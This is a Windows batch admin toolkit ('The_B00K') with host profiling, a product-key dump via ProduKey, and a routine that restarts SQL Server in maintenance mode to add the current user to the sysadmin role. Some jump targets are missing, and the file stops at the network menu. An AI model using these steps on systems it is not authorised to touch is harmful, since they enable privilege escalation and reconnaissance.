::---------------------The Book of IamUSER----------------------
::----------if not exist %sin% set whois=he & start %0----------

::__________________________DEV NOTES___________________________

REM - Set Unoversal Variables for psexec!

::______________________________________________________________

:: ----------------------------------------------------------------------------

@echo off
title The_B00K
::Set Logging
set LOGDIR=Log_B00K
if not exist %LOGDIR% md %LOGDIR%
set LOG=%LOGDIR%\Log_B00K.txt
echo The Book was opened @ %TIME% on %DATE% >> %LOG%
::Set Console Parameters
@setlocal enableextensions
IF ERRORLEVEL 1 ECHO ERROR: Unable to enable extensions. %time% >> %LOG%
@cd /d "%~dp0"
@color 0f
mode con: cols=82 lines=42
::Enable Colored Lines
SETLOCAL EnableDelayedExpansion
IF ERRORLEVEL 1 ECHO ERROR: Unable to enable delayed expansion. %time% >> %LOG%
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul > X set /p ".=."

:: ----------------------------------------------------------------------------

echo Throwing The_B00K @ it^^!
echo                                  .:::::::::::::::::::/:.
echo                 -:::::::-    ./:-                    `:/:.
echo            -::::`       `::/+/                          `:/:.
echo        .:::'                /+-                            `:::.
echo     .::-                      :+:`                            `-::.
echo  .+s-                           -+/`                             `-::.
echo  h.-+.                            .+/.                              `-::.
echo om. `+-                             .//.                               `-::.
echo -dm-  //`                             `/+-           .-:/+++++++++///////:'
echo  `yN/  -+`                              `:+-       :+-`                   `mh/.
echo    oNs` `+-                              ``:+:   +:`                    ...L33T:
echo     :mh.  //                     .-::///::::/hmy-     .-/osTheremmmmmmmmmWhiteKO
echo      .hm:  :+`              .-://-.`        :mNyhRabbitNMNnISddhhyNO++/:--````
echo       `sNo  .+.         .://:.`       .....::NMspoonYs+:-````````
echo         /Nh` `+:    .://:.`      .:/oyyytheUSERdh+-`
echo          -mm-  :+://:.`     ./sdFORNhs/.````````
echo           `hN+  s+`     ./dFIGHTS/.`
echo             oMy     .:odNEOw:.`
echo              +MmN-+hmho:`
echo               -dmy/.
echo 				%USERNAME% has opened The_B00K...
timeout /T 3 /NOBREAK >NUL

:: ----------------------------------------------------------------------------

::Diagnostics - Verify write access to the working directory.
:DIAG
set DIAGPASS=diagpass.txt
set DIAGFILE=diag.bat
echo Diagnostic Integrity Check...
echo EVENT: Diagnostic @ %TIME% >> %LOG%
if exist %DIAGFILE% start %DIAGFILE% & goto DIAGGOOD
if not exist %DIAGFILE% goto CREATEDIAG
 
:DIAGGOOD
color 0f
ping 127.0.0.1 -n 3 >nul
if not exist %DIAGPASS% set wtf=DiagError & goto WTF
echo Diagnostics Complete^^! Script will continue...
del %DIAGPASS%
goto GETSYS
 
:CREATEDIAG
color C
set /p warning=[Warning] No diag file installed^^! Create and execute? [Y/N]::
if /i "%warning%"=="Y" goto MKDIAG
if /i "%warning%"=="Yes" goto MKDIAG
if /i "%warning%"=="N" goto HELP
if /i "%warning%"=="No" goto HELP

:MKDIAG
echo Creating diagnostic file...
echo EVENT: Create Diag @ %TIME% >> %LOG%
echo ^@echo off > %DIAGFILE%
echo ::Diagnostic file created @ %TIME% on %DATE% >> %DIAGFILE%
echo copy nul ^> %DIAGPASS% >> %DIAGFILE%
echo PING 127.0.0.1 -n 1 -w 10 ^>NUL >> %DIAGFILE%
echo exit >> %DIAGFILE%
echo Executing diagnostic file...
start diag.bat
goto DIAG

:: ----------------------------------------------------------------------------

::Know Thyself
:GETSYS
echo.
set /p getprofile=Would you like to profile this system? [Y/N]::
if /i "%getprofile%"=="N" goto BEGIN
echo.
set colword=know
call :colbat f0 "Know_Thyself"
:cinit
echo.
echo.
FOR /F "tokens=2" %%a in ('whoami /user /fo table /nh') do SET SID=%%a
whoami /groups | find "12288" && set LOCAD=TRUE
:: BAD METHOD whoami /groups | findstr /b BUILTIN\Administrators | findstr /c:"Enabled group" && set LOCAD=TRUE
schtasks > NUL
IF %ERRORLEVEL% EQU 0 (
    set ADMIN=YES
) ELSE (
    set ADMIN=NO && set LOCAD=FALSE
)
if "%ADMIN%"=="YES" goto VERCHECK
if "%ADMIN%"=="NO" goto setadmin
:setadmin
color C
set /p setperm=[Warning] Not elevated! Run as Administrator? [Y/N]::
if /i "%setperm%"=="N" goto VERCHECK
if /i "%setperm%"=="NO" goto VERCHECK
if /i "%setperm%"=="Y" goto makeadmin
if /i "%setperm%"=="YES" goto makeadmin
:makeadmin
set /p whatadmin=Are you a Local or Domain Admin? [L/D]::
if /i "%whatadmin%"=="L" goto lad
if /i "%whatadmin%"=="D" goto dad
:lad
echo Elevating as Local Admin...
set /p ladname=Run as user::
runas /user:%ladname% %0
exit
:dad
echo Elevating as Domain Admin...
set /p dadname=Run as user::
set /p dname=Set Domain::
runas /user:%dname%\%dadname% %0
exit

:VERCHECK
::Check Windows Version
 ver | findstr /i "5\.0\." > nul
 IF %ERRORLEVEL% EQU 0 goto 2K
 ver | findstr /i "5\.1\." > nul
 IF %ERRORLEVEL% EQU 0 goto XP03
 ver | findstr /i "5\.2\." > nul
 IF %ERRORLEVEL% EQU 0 goto XP03
 ver | findstr /i "6\.0\." > nul
 IF %ERRORLEVEL% EQU 0 goto WIN7
 ver | findstr /i "6\.1\." > nul
 IF %ERRORLEVEL% EQU 0 goto WIN7
  ver | findstr /i "6\.2\." > nul
 IF %ERRORLEVEL% EQU 0 goto WIN8
  ver | findstr /i "6\.3\." > nul
 IF %ERRORLEVEL% EQU 0 goto WIN8
  ver | findstr /i "10\.0\." > nul
 IF %ERRORLEVEL% EQU 0 goto MS10
 goto VERSIONERROR
:2K
echo Windows 2000/NT Detected!
REM PUT WINDOWS NT SCRIPTS HERE
echo NOTICE: Script designed for post NT Windows versions!
::>
echo WinVer:NT >> %LOG%
goto READY
:XP03
echo Windows XP Detected!
REM PUT WINDOWS XP SCRIPTS HERE
::>
echo WinVer:XP >> %LOG%
goto READY
:WIN7
echo Windows Vista/7 Detected!
REM PUT WINDOWS 7 SCRIPTS HERE
::>
echo WinVer:7 >> %LOG%
goto READY
:WIN8
echo Windows 8 Detected!
REM PUT WINDOWS 8 SCRIPTS HERE
echo WARNING: Script untested in Windows 8!
::>
echo WinVer:8 >> %LOG%
goto READY
:MS10
echo Windows 10 Detected!
REM PUT WINDOWS 10 SCRIPTS HERE
echo WARNING: Script untested in Windows 10!
::>
echo WinVer:10 >> %LOG%
goto READY
:VERSIONERROR
echo CANT FIND OS!
echo ERROR: No Version! >> %LOG%
set WTF=VersionError
goto WTF

::Quickstat
:READY
echo You are logged in as: %username%
echo Profile on: %userprofile%
echo Running as Administrator: %ADMIN%
echo Local Administrator: %LOCAD%
echo System directory: %systemroot%
echo Windows directory: %windir%
echo Programs directory: %programfiles%
echo Temp directory: %temp%
echo Logon Sever: %logonserver%
echo Domain: %userdomain%

:SIGO
::Output folder variable
set OUT=Output
::Output variables for reported SysInfo
set SIDOC=%OUT%\SysInfo.txt
set DTDOC=%OUT%\Detail.txt
set DRDOC=%OUT%\Driver.txt
set PKEYDOC=%OUT%\PKeys.txt
set MSI32=%OUT%\MSI32.nfo
::Output variables for reported Installed Apps
set INSTALL=%OUT%\Installs.csv
REM INTXT and PRGDMP files are used to create the Installed Apps CSV
set INTXT=%OUT%\Installs.txt
set PRGDMP=%OUT%\progdump.txt
::Output check for old SysInfo
if exist ".\%computername%" goto REDOSI
goto SYSINFO

:REDOSI
set /p resi=System Info files for this device exist^^! Reaquire? [Y/N]::
if /i "%resi%"=="Y" echo EVENT: SysInfo Found. Reaquiring. >> %LOG% && goto SYSINFO
if /i "%resi%"=="Yes" echo EVENT: SysInfo Found. Reaquiring. >> %LOG% && goto SYSINFO
if /i "%resi%"=="N" echo EVENT: SysInfo Found. Fast Startup. >> %LOG% && goto BEGIN
if /i "%resi%"=="No" echo EVENT: SysInfo Found. Fast Startup. >> %LOG% && goto BEGIN
goto BEGIN

::Mfg/Sys Info
:SYSINFO
if exist "%~d0%~p0%computername%" rd /s /q "%~d0%~p0%computername%"
if not exist %OUT% md %OUT%
if not exist %OUT% set WTF=NoOutputDir & goto WTF
echo Generating: SysInfo Report
echo.
echo ************************ >> %SIDOC%
echo ***SYSTEM INFORMATION*** >> %SIDOC%
echo ************************ >> %SIDOC%
echo EVENT: SysInfo Start @ %TIME% >> %LOG%
hostname >> %SIDOC%
date /t >> %SIDOC%
time /t >> %SIDOC%
echo User: %username% >> %SIDOC%
echo User SID: %SID% >> %SIDOC%
echo Profile: %userprofile% >> %SIDOC%
echo Administrator: %ADMIN% >> %SIDOC%
echo Local Administrator: %LOCAD% >> %SIDOC%
echo System Dir: %systemroot% >> %SIDOC%
echo Windows Dir: %windir% >> %SIDOC%
echo Programs Dir: %programfiles% >> %SIDOC%
echo Temp Dir: %temp% >> %SIDOC%
echo Logon Sever: %logonserver% >> %SIDOC%
echo Domain: %userdomain% >> %SIDOC%
wmic /append:%SIDOC% systemenclosure get serialnumber
wmic /append:%SIDOC% csproduct get vendor,name,identifyingnumber
wmic /append:%SIDOC% OS get servicepackmajorversion,caption,csname
systeminfo >> %SIDOC%
echo. >> %SIDOC%
wmic /append:%SIDOC% onboarddevice get Description, DeviceType, Enabled, Status

::Network Info
echo Generating: Network Info
echo *************************** >> %SIDOC%
echo ***NETWORK CONFIGURATION*** >> %SIDOC%
echo *************************** >> %SIDOC%
nslookup myip.opendns.com resolver1.opendns.com >> %SIDOC%
ipconfig >> %SIDOC%
getmac /v >> %SIDOC%
echo. >> %SIDOC%
echo Networked Windows Devices >> %SIDOC%
net view >> %SIDOC%

::Product Key Info (Requires NirSoft ProduKey)
app\ProduKey.exe /nosavereg /stext %PKEYDOC%

::Drive Info
echo Generating: Drive Info
echo.
echo ***************************** >> %SIDOC%
echo ***DRIVES CURRENTLY ACTIVE*** >> %SIDOC%
echo ***************************** >> %SIDOC%
wmic /append:%SIDOC% logicaldisk get size,freespace,caption
net use >> %SIDOC%
wmic /append:%SIDOC% cdrom list brief

::Peripheral Info
echo Generating: Peripheral Summary
echo.
echo ********************************* >> %SIDOC%
echo **PRINTERS CURRENTLY INSTALLED*** >> %SIDOC%
echo ********************************* >> %SIDOC%
wmic /append:%SIDOC% printer get name

::Installed Programs
echo Generating: Installed Applications Report
echo.
echo ************************************** >> %SIDOC%
echo ***APPLICATIONS CURRENTLY INSTALLED*** >> %SIDOC%
echo ************************************** >> %SIDOC%
wmic /append:%SIDOC% product get name,version
REM Aquire program list from registry and format valid names as csv.
regedit /e %PRGDMP% "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall" 
find "DisplayName" %PRGDMP% > %INTXT%
for /f "tokens=2 delims==" %%a in (%INTXT%) do echo %%~a >> %INSTALL%
REM DEL lines remove the files used to create the CSV. Keeping progdump is recommended!
del %INTXT%
::del %PRGDMP%
if exist %INTXT% echo APPLICATION DISPLAYNAME LOG RETAINED!!!
if exist %PRGDMP% echo APPLICATION REGISTRY DUMP RETAINED!!!

::Detailed Dump
echo Generating: Verbose Details
echo.
echo *************************** > %DTDOC%
echo ***BEGIN VERBOSE DETAILS*** >> %DTDOC%
echo *************************** >> %DTDOC%
set >> %DTDOC%
net start >> %DTDOC%
ipconfig /all >> %DTDOC%
route print >> %DTDOC%
arp -a >> %DTDOC%
netstat -a >> %DTDOC%
tasklist >> %DTDOC%
assoc >> %DTDOC%
driverquery /FO list /v > %DRDOC%
echo Dumping MSInfo Please Wait...
msinfo32 /nfo %MSI32%
echo ************************* >> %DTDOC%
echo ***END VERBOSE DETAILS*** >> %DTDOC%
echo ************************* >> %DTDOC%

if exist %OUT% rename %OUT% %computername%

echo SysInfo Extraction Complete! Continuing.
echo EVENT: SysInfo End @ %TIME% >> %LOG%
::pause
goto BEGIN

:: ----------------------------------------------------------------------------

::Help_ME
:HELP
cls
title Help_ME!
color E
echo MENU: Help @ %TIME% >> %LOG%
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
echo Ms--dMMMMy--hMMMMMMMMMMMMs--NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh--yM
echo M+  dMMMMs  yMMMNmdmNMMMM+  NMNmmMNmmNMMMMMMMMMNNNMNmmNMMmmmMMMMMMNmdmNMMMMy  oM
echo M+  sdddd+  yMNs-.--.:hMM+  NMs..+--../dMMMMMMMo..+-.`-s:-..-hMMh:.--.-oNMMd  sM
echo M+  .....`  yM+ `ydd/ `hM+  NMs  /dmh. .NMMMMMM+  ymd.  ymd` -Md` /hdy` /MMN` mM
echo M+  ymmmmo  yM` `::::..oM+  NMs  mMMMo  dMMMMMM+  NMM: `MMM. .Ms  -:::-..MMM:`MM
echo M+  dMMMMs  yM: `hmmyoomM+  NMs  smNm- `NMMMMMM+  NMM: `MMM. .Mh  ommdsoyMMNysmM
echo Mo``dMMMMs``yMm/..--..oNMo``NMs  :--.`-hM_____M+``NMM/`.MMM-`-MMs-.--..:dMMh``sM
echo MmddNMMMMNddNMMMmdhhdNMMMNddMMs  mdhhdNMMMMMMMMmddMMMmddMMMmdmMMMNdhhhmMMMMNddNM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs``mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNddMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
echo ::Help_ME::
echo.
echo 1 - Run.Diag
echo 2 - Reopen.The_B00K
echo 3 - Check.CMD
echo 4 - Clear.Logfile
echo 5 - Show.Path.Info
echo 6 - Get.Sys.Info
echo 7 - Verify.Files
echo X - Close.Help_ME
echo.
echo Your last selection was: %help%
set /p help=Selection [1-inf]:
echo Option %help% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%
 
if "%help%"=="1" goto DIAG
if "%help%"=="2" goto RESTARTBOOK
if "%help%"=="3" goto SYNTAX
if "%help%"=="4" goto CLEARLOG
if "%help%"=="5" goto PATHINFO
if "%help%"=="6" goto GETSYS
if "%help%"=="7" goto VERIFILE
if /i "%help%"=="WTF" set WTF=WTFTest & goto WTF
if "%help%"=="x" goto HELPOUT
goto HELP
 
:SYNTAX
echo Syntax Assistant...
echo.
set /p command=Type command name here:
help %command%
pause
goto HELP

:CLEARLOG
echo Clearing logs folder...
echo.
del %LOG%
if exist %LOG% (
echo Logfile removal failed! Try again. & pause & goto clearlog
)
if not exist %LOG% (
echo Logfile removed! & pause & goto help
)

:PATHINFO
echo Pathing Details...
echo.
echo Filename as called: %0
echo Driveletter:        %~d0
echo Short Path:         %~p0
echo Filename:           %~n0
echo Extension:          %~x0
echo Complete:           %~d0%~p0%~n0%~x0
pause
goto HELP

:VERIFILE
echo Verify Windows Protected System Files...
echo.
set /p vfile=Enter a single file path, ALL to verify all and repair, or SAFE to verify all only:
if "%vfile%"=="all" goto vfileall
if "%vfile%"=="safe" goto vfilesafe
sfc /VERIFYFILE %vfile%
IF %ERRORLEVEL% EQU 1 set WTF=ProbablyNotSystemFile & goto WTF
goto HELP
:vfileall
sfc /SCANNOW
:vfilesafe
sfc /VERIFYONLY

:HELPOUT
goto BEGIN

:: ----------------------------------------------------------------------------

::The_B00K
:RESTARTBOOK
title The_B00K
color 0f
cls
echo You have chosen to reopen The_B00K...
pause
start %0
echo The_B00K reopened at %time% on %date% with the username: %username%
exit

:BEGIN
title The_B00K
color 0f
cls
echo MENU: Index @ %TIME% >> %LOG%
set colword=index
call :colbat f0 "The_INDEX"
:cindex
echo.
echo.
echo ^# - Available Chapters
echo.
echo 01 - Show.SysInfo
echo 02 - CMD.Console
echo 03 - Registry.Edit
echo 04 - Control.Panel
echo 05 - Mgmt.Console
echo 06 - MS.Config
echo 07 - Time.Date
echo 08 - Console.Writer
echo 09 - Console.Reader
echo 10 - User.Info
echo 11 - Auto.Pagefile
echo DB - Open.DB_MENU
echo N - Open.Net_MENU
echo R - Open.Remote_MENU
echo V - Verify.Files
echo X - Close.The_B00K
echo.
echo ^? - Open.Help_ME
echo.
echo Your last selection was: %begin% 
set /p begin=Selection [1-inf]:
echo Option %begin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%

if "%begin%"=="1" goto SYSINF
if "%begin%"=="2" goto CMD
if "%begin%"=="3" goto REGEDIT
if "%begin%"=="4" goto CTRLPNL
if "%begin%"=="5" goto MMC
if "%begin%"=="6" goto MSCFG
if "%begin%"=="7" goto TIMEDATE
if "%begin%"=="8" goto CONWRITE
if "%begin%"=="9" goto CONREAD
if "%begin%"=="10" goto UINFO
if "%begin%"=="11" goto APCU
if /i "%begin%"=="db" goto DBMENU
if /i "%begin%"=="n" goto NETMENU
if /i "%begin%"=="r" goto REMMENU
if /i "%begin%"=="v" goto VERIFILE
if "%begin%"=="?" goto HELP
if /i "%begin%"=="help" goto HELP
if /i "%begin%"=="x" goto EXIT
if "%begin%"=="#" goto HELLOWORLD
goto BEGIN

::1
:SYSINF
echo.
echo EVENT: Display SysInfo @ %TIME% >> %LOG%
echo Show.SysInfo - Showing Collected System Info...
Start "" "%computername%"
pause
goto BEGIN

::2
:CMD
echo.
echo EVENT: Open CMD @ %TIME% >> %LOG%
echo CMD.Console - Launching Command Console...
start cmd.exe
pause
goto BEGIN

::3
:REGEDIT
echo.
echo EVENT: Open Regedit @ %TIME% >> %LOG%
echo Registry.Edit - Launching RegEdit...
start regedit.exe
pause
goto BEGIN

::4
:CTRLPNL
echo.
echo EVENT: Display ControlPanel @ %TIME% >> %LOG%
echo Control.Panel - Launching Control Panel...
start Control
pause
goto BEGIN

::5
:MMC
echo.
echo EVENT: Display MMC @ %TIME% >> %LOG%
echo Mgmt.Console - Launching MS Management Console...
mmc
pause
goto BEGIN

::6
:MSCFG
echo.
echo EVENT: Display MSConfig @ %TIME% >> %LOG%
echo MS.Config - Launching Microsoft System Configuration...
msconfig
pause
goto BEGIN

::7
:TIMEDATE
echo.
echo EVENT: Set TimeDate @ %TIME% >> %LOG%
echo Time.Date - Set PC Time and Date with Advanced Options.
echo.
set /p ti=Enter the new time [NTP, DC, or HH:MM:SS AM/PM] Blank to skip::
if /i "%ti%"=="ntp" goto NETTIME
if /i "%ti%"=="net" goto NETTIME
if /i "%ti%"=="dc" goto DCTIME
if /i "%ti%"=="domain" goto DCTIME
time %ti%
set /p begin6= Would you like to change date as well? [Y/N]::
if /i "%begin6%"=="Y" goto date
if /i "%begin6%"=="Yes" goto date
if /i "%begin6%"=="N" goto begin
if /i "%begin6%"=="No" goto begin
:DATE
set /p da= Enter the new date [DD:MM:YYYY]::
date %da%
pause
goto BEGIN
:NETTIME
echo EVENT: NTP Time @ %TIME% >> %LOG%
net stop "w32time"
set /p pickpool=Use a custom NTP server pool? (Default: North-America.Pool.NTP.org)[Y/N]::
if /i "%pickpool%"=="Y" goto cntp
if /i "%pickpool%"=="Yes" goto cntp
if /i "%pickpool%"=="N" goto ntpgo
if /i "%pickpool%"=="No" goto ntpgo
:cntp
echo EVENT: NTP Set Custom @ %TIME% >> %LOG%
set /p cntp0=Enter NTP server 0 IP or FQDN::
set /p cntp1=Enter NTP server 1 IP or FQDN [Blank to skip]::
set /p cntp2=Enter NTP server 2 IP or FQDN [Blank to skip]::
echo Syncing time with custom NTP Pool!
w32tm /config /manualpeerlist:"%cntp0% %cntp1% %cntp2%"
goto ntpend
:ntpgo
echo EVENT: NTP Set Default @ %TIME% >> %LOG%
echo Syncing time with North American NTP Pool!
w32tm /config /manualpeerlist:"0.north-america.pool.ntp.org 1.north-america.pool.ntp.org 2.north-america.pool.ntp.org"
:ntpend
w32tm /config /syncfromflags:MANUAL
w32tm /config /reliable:YES
net start "w32time"
echo Updating...
w32tm /resync
echo Checking Peers...
w32tm /query /peers
pause
echo Checking status...
w32tm /query /status
echo Time settings processed!
pause
echo EVENT: NTP Time End @ %TIME% >> %LOG%
goto BEGIN
:DCTIME
echo EVENT: DC Time @ %TIME% >> %LOG%
net stop "w32time"
echo Syncing time with Domain Controller!
w32tm /config /syncfromflags:DOMHIER
net start "w32time"
echo Updating...
w32tm /resync
echo Checking Peers...
w32tm /query /peers
pause
echo Checking status...
w32tm /query /status
pause
echo EVENT: DC Time End @ %TIME% >> %LOG%
goto BEGIN

::8
:CONWRITE
echo.
echo EVENT: Console Writer @ %TIME% >> %LOG%
echo Console.Writer - Copy console input to a file.
echo.
set /p conwrfile=What would you like to name the output file? [Ctrl+Z to Exit]::
copy con %conwrfile%
echo %conwrfile% Created^^!
pause
goto BEGIN

::9
:CONREAD
echo.
echo EVENT: Console Reader @ %TIME% >> %LOG%
echo Console.Reader - Display file data in console window.
echo.
set /p crfile=What file would you like to read? [Default path %~p0]::
type %crfile% con
if errorlevel 1 copy %crfile% con
if errorlevel 1 
pause
goto BEGIN

::10
:UINFO
echo.
echo EVENT: UserInfo @ %TIME% >> %LOG%
echo User.Info - Show local user details.
net user
set /p uinf=Select user account::
net user %uinf%
pause
goto BEGIN

::11
:APCU
color 0b
echo.
echo   ____________________________________________
echo  /\     ______    ______    ______    __  __  \
echo  \ \   /\  __ \  /\  __ \  /\  ___\  /\ \/\ \  \
echo   \ \  \ \ \_\ \ \ \ \_\ \ \ \ \__/  \ \ \ \ \  \
echo    \ \  \ \  _  \ \ \  ___\ \ \ \     \ \ \ \ \  \
echo     \ \  \ \ \/\ \ \ \ \__/  \ \ \____ \ \ \_\ \  \
echo      \ \  \ \_\ \_\ \ \_\     \ \_____\ \ \_____\  \
echo       \ \  \/_/\/_/  \/_/      \/_____/  \/_____/   \
echo        \ \___________________________________________\
echo         \/___________________________________________/
echo.
echo        [A]utomatic [P]agefile [C]onfiguration [U]tility
echo   __________________________________________________________
echo  ^|                                                          ^|
echo  ^| Welcome to the Automatic Pagefile Configuration Utility! ^|
echo  ^| This tool will automatically configure the pagefile size ^|
echo  ^| to twice the amount of RAM in this computer.             ^|
echo  ^|                                                          ^|
echo  ^| If this script is not run as administrator it may fail.  ^|
echo  ^|__________________________________________________________^|
echo.
pause
cls
color f0
REM This line creates a variable named RAM_QUANTITY which holds a value equal to the amount of RAM in the computer per the systeminfo command
for /F "tokens=4" %%A in ('systeminfo ^|findstr /c:"Total Physical Memory:"') do (set RAM_QUANTITY=%%A)
REM This line removes any commas from the RAM_QUANTITY variable so that math can be performed on it
set RAM_QUANTITY=%RAM_QUANTITY:,=%
REM This line creates a variable named PAGEFILE_SIZE which holds a value equal to exactly double that of the RAM_QUANTITY variable
set /a PAGEFILE_SIZE=%RAM_QUANTITY%*2
REM This line creates a variable named FREE_SPACE which holds a value equal to the bytes free on the C: drive
for /f "tokens=3" %%A in ('dir C:\ ^|findstr /c:"bytes free"') do (set FREE_SPACE=%%A)
REM This line removes any commas from the FREE_SPACE variable so that math can be performed on it
set FREE_SPACE=%FREE_SPACE:,=%
REM This line converts the megabytes value of the PAGEFILE_SIZE variable to bytes and stores it as the PAGEFILE_SIZE_BYTES variable for
REM easy comparison with the FREE_SPACE variable.  The conversion is approximate.  It simply appends six 0's onto the end of the value.
REM I would prefer an exact calculated value, but a limitation on the maximum value of valid numbers when using the "set /a" command prevents
REM me from multiplying or dividing numbers of high values (which are likely to be found in modern computers) when using "set /a".
set PAGEFILE_SIZE_BYTES=%PAGEFILE_SIZE%000000
REM The following IF/ELSE lines compare PAGEFILE_SIZE_BYTES to FREE_SPACE.  If FREE_SPACE is greater than PAGEFILE_SIZE_BYTES then the script continues.  Otherwise a warning is displayed instead.
IF %FREE_SPACE% GTR %PAGEFILE_SIZE_BYTES% (
	goto :SET-PAGEFILE-SIZE
) ELSE (
	goto :FREE-SPACE-ERROR
)
:SET-PAGEFILE-SIZE
REM This line runs the actual command to set the pagefile size of the computer and sets the pagefile equal to the value held by the PAGEFILE_SIZE variable
start /wait /b powershell -command "Set-ItemProperty -Path 'registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'PagingFiles' -Value 'c:\pagefile.sys %PAGEFILE_SIZE% %PAGEFILE_SIZE%'"
cls
color 0a
echo          __
echo         / /  Pagefile has been successfully configured
echo        / /   to twice the size of the installed RAM.
echo   __  / /
echo  /\ \/ /     RAM QUANTITY..............%RAM_QUANTITY%000000 Bytes
echo  \ \__/      SPECIFIED PAGEFILE SIZE...%PAGEFILE_SIZE_BYTES% Bytes
echo   \/_/       FREE SPACE................%FREE_SPACE% Bytes
echo.
echo              Reopening The_B00K...
echo.
pause
goto :BEGIN
:FREE-SPACE-ERROR
REM The following few lines display an error message which will result if there is not enough free space on C: to set a pagefile size equal to twice the quantity of RAM
cls
color 0c
echo.
echo    __    __  There is insufficient free disk space
echo   /\ \  / /  on the C: drive to create a pagefile
echo   \ \ \/ /   of the specified size.
echo    \ \  /    No changes have been made.
echo     \/  \
echo     / /\ \   RAM QUANTITY..............%RAM_QUANTITY%000000 Bytes
echo    /_/\ \_\  SPECIFIED PAGEFILE SIZE...%PAGEFILE_SIZE_BYTES% Bytes
echo   /_/  \/_/  FREE SPACE................%FREE_SPACE% Bytes
echo.
echo              This script will now abort.
echo.
pause
set wtf=InsufficientFreeSpace goto WTF

:: ----------------------------------------------------------------------------
echo _______________________                   _______
echo \   ______    ______   \        |\    /| |        |\      | |      |
echo  \  \      \  \     \   \       | \  / | |        | \     | |      |
echo   \  \   \  \  \_____\_  \      |  \/  | |___     |  \    | |      |
echo    \  \   \  \  \      \  \     |      | |        |   |   | |      |
echo     \  \   \  \  \      \  \    |      | |        |    \  | |      |
echo      \  \______)  \______)  \   |      | |        |     \ | |      |
echo       \______________________\  |      | |_______ |      \| |______|
:DBMENU
title DB_MENU
color 0f
cls
echo MENU: DBMENU @ %TIME% >> %LOG%
set colword=db
call :colbat f0 "DB_MENU"
:cdb
echo.
echo.
echo 1 - AddSelf.MSSQLEXPRESS.Admin
echo X - Close.DB_MENU
echo.
echo Your last selection was: %dbbegin% 
set /p dbbegin=Selection [1-inf]:
echo Option %dbbegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%

echo NetOption %ibegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%
if "%dbbegin%"=="1" goto SQLSA
if /i "%dbbegin%"=="x" goto BEGIN
goto DBMENU

::1db
setlocal
set sqlresult=N/A
if .%1 == . (set /P sqlinstance=Enter SQL instance name, or default to SQLEXPRESS: ) else (set sqlinstance=%1)
if .%sqlinstance% == . (set sqlinstance=SQLEXPRESS)
if /I %sqlinstance% == MSSQLSERVER (set sqlservice=MSSQLSERVER) else (set sqlservice=MSSQL$%sqlinstance%)
if .%2 == . (set sqllogin="%USERDOMAIN%\%USERNAME%") else (set sqllogin=%2)
for %%i in (%sqllogin%) do set sqllogin=%%~i
@echo Adding '%sqllogin%' to the 'sysadmin' role on SQL Server instance '%sqlinstance%'.
@echo Verify the '%sqlservice%' service exists ...
set srvstate=0
for /F "usebackq tokens=1,3" %%i in (`sc query %sqlservice%`) do if .%%i == .STATE set srvstate=%%j
if .%srvstate% == .0 goto existerror
if NOT .%2 == . goto continue
echo new ActiveXObject("Shell.Application").ShellExecute("cmd.exe", "/D /Q /C pushd \""+WScript.Arguments(0)+"\" & \""+WScript.Arguments(1)+"\" %sqlinstance% \""+WScript.Arguments(2)+"\"", "", "runas"); >"%TEMP%\addsysadmin{7FC2CAE2-2E9E-47a0-ADE5-C43582022EA8}.js"
call "%TEMP%\addsysadmin{7FC2CAE2-2E9E-47a0-ADE5-C43582022EA8}.js" "%cd%" %0 "%sqllogin%"
del "%TEMP%\addsysadmin{7FC2CAE2-2E9E-47a0-ADE5-C43582022EA8}.js"
goto :EOF
:continue
set srvstarted=0
set srvstate=0
for /F "usebackq tokens=1,3" %%i in (`sc query %sqlservice%`) do if .%%i == .STATE set srvstate=%%j
if .%srvstate% == .0 goto queryerror
if .%srvstate% == .1 goto startm
set srvstarted=1
@echo Stop the '%sqlservice%' service ...
net stop %sqlservice%
if errorlevel 1 goto stoperror
:startm
@echo Start the '%sqlservice%' service in maintenance mode ...
sc start %sqlservice% -m -T3659 -T4010 -T4022 >nul
if errorlevel 1 goto startmerror
:checkstate1
set srvstate=0
for /F "usebackq tokens=1,3" %%i in (`sc query %sqlservice%`) do if .%%i == .STATE set srvstate=%%j
if .%srvstate% == .0 goto queryerror
if .%srvstate% == .1 goto startmerror
if NOT .%srvstate% == .4 goto checkstate1
@echo Add '%sqllogin%' to the 'sysadmin' role ...
for /F "usebackq tokens=1,3" %%i in (`sqlcmd -S np:\\.\pipe\SQLLocal\%sqlinstance% -E -Q "create table #foo (bar int); declare @rc int; execute @rc = sp_addsrvrolemember '$(sqllogin)', 'sysadmin'; print 'RETURN_CODE : '+CAST(@rc as char)"`) do if .%%i == .RETURN_CODE set sqlresult=%%j
@echo Stop the '%sqlservice%' service ...
net stop %sqlservice%
if errorlevel 1 goto stoperror
if .%srvstarted% == .0 goto sqlsaexit
net start %sqlservice%
if errorlevel 1 goto starterror
goto sqlsaexit
:existerror
sc query %sqlservice%
@echo '%sqlservice%' service is invalid
goto sqlsaexit
:queryerror
@echo 'sc query %sqlservice%' failed
goto sqlsaexit
:stoperror
@echo 'net stop %sqlservice%' failed
goto sqlsaexit
:startmerror
@echo 'sc start %sqlservice% -m' failed
goto sqlsaexit
:starterror
@echo 'net start %sqlservice%' failed
goto sqlsaexit
:sqlsaexit
if .%sqlresult% == .0 (@echo '%sqllogin%' was successfully added to the 'sysadmin' role.) else (@echo '%sqllogin%' was NOT added to the 'sysadmin' role: SQL return code is %sqlresult%.)
endlocal
pause

:: ----------------------------------------------------------------------------

::Required Apps: PuTTy Portable
:NETMENU
title Net_MENU
color 0f
cls
echo MENU: NetMENU @ %TIME% >> %LOG%
set colword=net
